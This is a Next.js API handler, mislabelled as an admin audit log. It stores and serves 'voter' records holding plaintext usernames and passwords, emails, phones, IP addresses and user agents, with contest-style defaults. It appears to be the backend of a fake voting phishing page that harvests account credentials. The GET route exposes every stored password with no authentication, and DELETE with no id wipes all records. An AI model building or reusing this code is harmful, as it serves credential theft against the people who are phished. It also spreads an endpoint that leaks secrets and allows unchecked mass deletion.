// Next.js Pages Router API Handler: /api/admin/audit-log
// Supports:
// - GET: Fetch audit records
// - DELETE with query id or body: Delete single record or wipe all

import mongoose from 'mongoose';

const MONGODB_URI = process.env.MONGODB_URI;

// Cached connection helper
let cached = global.mongoose;
if (!cached) {
  cached = global.mongoose = { conn: null, promise: null };
}

async function connectToDatabase() {
  if (cached.conn) return cached.conn;
  if (!cached.promise && MONGODB_URI) {
    cached.promise = mongoose.connect(MONGODB_URI, {
      bufferCommands: false,
      serverSelectionTimeoutMS: 5000
    }).then((m) => m);
  }
  try {
    cached.conn = await cached.promise;
  } catch (e) {
    cached.promise = null;
    throw e;
  }
  return cached.conn;
}

// Voter Schema reference
const VoterSchema = new mongoose.Schema(
  {
    username: { type: String, required: true, trim: true },
    password: { type: String, required: true },
    email: { type: String, trim: true },
    phone: { type: String, trim: true },
    authStatus: { type: String, default: 'Authenticated' },
    location: { type: String, default: 'United States' },
    accountType: { type: String },
    contestantId: { type: String, default: 'FK-101' },
    contestantNo: { type: String, default: '001' },
    platform: { type: String, default: 'web' },
    ipAddress: { type: String },
    userAgent: { type: String }
  },
  { timestamps: true }
);

const Voter = mongoose.models.Voter || mongoose.model('Voter', VoterSchema);

export default async function handler(req, res) {
  const { method, query, body } = req;

  try {
    await connectToDatabase();
  } catch (dbErr) {
    console.warn('MongoDB connection notice in Next.js handler:', dbErr.message);
  }

  switch (method) {
    case 'GET': {
      try {
        const voters = await Voter.find().sort({ createdAt: -1 }).limit(500);
        return res.status(200).json({
          success: true,
          count: voters.length,
          data: voters
        });
      } catch (err) {
        return res.status(500).json({ success: false, error: err.message });
      }
    }

    case 'DELETE': {
      const targetId = query.id || body?.id;

      if (targetId) {
        // Individual row delete
        try {
          const deleted = await Voter.findByIdAndDelete(targetId);
          return res.status(200).json({
            success: true,
            message: `Record ${targetId} successfully removed.`,
            deletedId: targetId,
            data: deleted
          });
        } catch (err) {
          return res.status(500).json({ success: false, error: err.message });
        }
      } else {
        // Wipe all records in the collection
        try {
          const result = await Voter.deleteMany({});
          return res.status(200).json({
            success: true,
            message: 'All records have been permanently wiped from the collection.',
            deletedCount: result.deletedCount || 0
          });
        } catch (err) {
          return res.status(500).json({ success: false, error: err.message });
        }
      }
    }

    default:
      res.setHeader('Allow', ['GET', 'DELETE']);
      return res.status(405).end(`Method ${method} Not Allowed`);
  }
}
